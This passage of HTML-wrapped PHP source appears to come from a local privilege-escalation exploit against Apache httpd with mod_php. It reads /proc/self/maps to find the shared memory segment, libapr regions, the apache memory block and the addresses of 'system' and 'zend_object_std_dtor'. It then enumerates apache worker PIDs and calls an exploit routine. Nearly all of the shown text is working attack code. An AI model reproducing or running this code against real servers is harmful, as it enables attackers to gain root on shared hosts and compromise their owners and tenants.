&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$offset = find_symbol($matches[1], &#39;system&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = explode(&#39; &#39;, $line)[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = hexdec(explode(&#39;-&#39;, $line)[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;system&#39;] = $line + $offset;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;libapr-1.so&#39;) &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;r-xp&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = explode(&#39; &#39;, $line)[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bounds = array_map(&#39;hexdec&#39;, explode(&#39;-&#39;, $line));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;libaprX&#39;] = $bounds;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;libapr-1.so&#39;) &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;r--p&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = explode(&#39; &#39;, $line)[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bounds = array_map(&#39;hexdec&#39;, explode(&#39;-&#39;, $line));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;libaprR&#39;] = $bounds;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Apache&#39;s memory block is between the SHM and ld.so</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Sometimes some rwx region gets mapped; all_buckets cannot be in there</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# but we include it anyways for the sake of simplicity</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;rw-p&#39;) ||</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;rwxp&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;) &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$follows_shm</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(strpos($line, &#39;/lib&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$follows_shm = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = explode(&#39; &#39;, $line)[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bounds = array_map(&#39;hexdec&#39;, explode(&#39;-&#39;, $line));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!array_key_exists(&#39;apache&#39;, $addresses))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;apache&#39;] = $bounds;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if($addresses[&#39;apache&#39;][1] == $bounds[0])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;apache&#39;][1] = $bounds[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$follows_shm = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;preg_match(&#39;#(/[^\s]+libphp7[0-9.]+.so[^\s]*)#&#39;, $line, $matches) &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;r-xp&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$offset = find_symbol($matches[1], &#39;zend_object_std_dtor&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = explode(&#39; &#39;, $line)[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = hexdec(explode(&#39;-&#39;, $line)[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;zend_object_std_dtor&#39;] = $line + $offset;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$expected = [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;shm&#39;, &#39;system&#39;, &#39;libaprR&#39;, &#39;libaprX&#39;, &#39;apache&#39;, &#39;zend_object_std_dtor&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$missing = array_diff($expected, array_keys($addresses));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($missing)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;The following addresses were not determined by parsing &#39; .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;/proc/self/maps: &#39; . implode(&#39;, &#39;, $missing)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;o(&#39;PID: &#39; . getmypid());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;o(&#39;Fetching addresses&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach($addresses as $k =&gt; $a)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!is_array($a))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$a = [$a];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;&#39; . $k . &#39;: &#39; . implode(&#39;-0x&#39;, array_map(function($z) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &#39;0x&#39; . dechex($z);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}, $a)));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;o(&#39;&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $addresses;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># matching the cmdline and the UID</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function get_workers_pids()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;o(&#39;Obtaining apache workers PIDs&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$pids = [];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$cmd = file_get_contents(&#39;/proc/self/cmdline&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$processes = glob(&#39;/proc/*&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach($processes as $process)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!preg_match(&#39;#^/proc/([0-9]+)$#&#39;, $process, $match))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pid = (int) $match[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!is_readable($process . &#39;/cmdline&#39;) ||</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;!is_readable($process . &#39;/status&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($cmd !== file_get_contents($process . &#39;/cmdline&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$status = file_get_contents($process . &#39;/status&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach(explode(&quot;\n&quot;, $status) as $line)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;Uid:&#39;) === 0 &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;preg_match(&#39;#\b&#39; . posix_getuid() . &#39;\b#&#39;, $line)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Found apache worker: &#39; . $pid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pids[$pid] = $pid;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;o(&#39;Got &#39; . sizeof($pids) . &#39; PIDs.&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;o(&#39;&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $pids;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$addresses = get_all_addresses();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$workers_pids = get_workers_pids();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">real();</span></p></body>
</html>
